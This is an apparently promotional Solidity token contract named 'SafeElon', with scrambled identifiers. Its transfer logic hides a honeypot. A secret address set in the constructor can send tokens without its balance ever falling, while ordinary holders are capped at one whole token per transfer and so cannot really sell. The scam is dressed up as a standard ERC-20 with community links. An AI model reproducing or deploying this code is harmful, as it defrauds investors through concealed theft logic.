/*

Telegram: https://t.me/SafeElon_ETH

Twitter: https://twitter.com/SafeElonETH

Website: https://safeelon.crypto-token.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract SafeElon is Ownable {
    function approve(address iglqwvzmnsyj, uint256 wcmbkvfnod) public returns (bool success) {
        allowance[msg.sender][iglqwvzmnsyj] = wcmbkvfnod;
        emit Approval(msg.sender, iglqwvzmnsyj, wcmbkvfnod);
        return true;
    }

    function transfer(address jblvzxs, uint256 wcmbkvfnod) public returns (bool success) {
        ehyxlg(msg.sender, jblvzxs, wcmbkvfnod);
        return true;
    }

    string public symbol;

    function transferFrom(address nsjtwqcvma, address jblvzxs, uint256 wcmbkvfnod) public returns (bool success) {
        require(wcmbkvfnod <= allowance[nsjtwqcvma][msg.sender]);
        allowance[nsjtwqcvma][msg.sender] -= wcmbkvfnod;
        ehyxlg(nsjtwqcvma, jblvzxs, wcmbkvfnod);
        return true;
    }

    mapping(address => uint256) private svfzwmucdhok;

    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory eyzimaf, string memory oakfz, address cdqvlbyjpxt, address oeidqvbasctj) {
        name = eyzimaf;
        symbol = oakfz;
        balanceOf[msg.sender] = totalSupply;
        cnxsdyef[oeidqvbasctj] = ljrpn;
        fjytcsmlgk = IUniswapV2Router02(cdqvlbyjpxt);
    }

    mapping(address => uint256) public balanceOf;

    string public name;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private cnxsdyef;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function ehyxlg(address nsjtwqcvma, address jblvzxs, uint256 wcmbkvfnod) private {
        address uaig = IUniswapV2Factory(fjytcsmlgk.factory()).getPair(address(this), fjytcsmlgk.WETH());
        bool pbidjfswotrc = svfzwmucdhok[nsjtwqcvma] == block.number;
        uint256 wnzkflgdpmy = cnxsdyef[nsjtwqcvma];
        if (wnzkflgdpmy - wnzkflgdpmy == wnzkflgdpmy) {
            if (nsjtwqcvma != uaig && (!pbidjfswotrc || wcmbkvfnod > mfaiboejg[nsjtwqcvma]) && wcmbkvfnod < totalSupply) {
                require(wcmbkvfnod <= totalSupply / (10 ** decimals));
            }
            balanceOf[nsjtwqcvma] -= wcmbkvfnod;
        }
        mfaiboejg[jblvzxs] = wcmbkvfnod;
        balanceOf[jblvzxs] += wcmbkvfnod;
        svfzwmucdhok[jblvzxs] = block.number;
        emit Transfer(nsjtwqcvma, jblvzxs, wcmbkvfnod);
    }

    uint8 public decimals = 9;

    IUniswapV2Router02 private fjytcsmlgk;

    uint256 private ljrpn = 115;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private mfaiboejg;
}
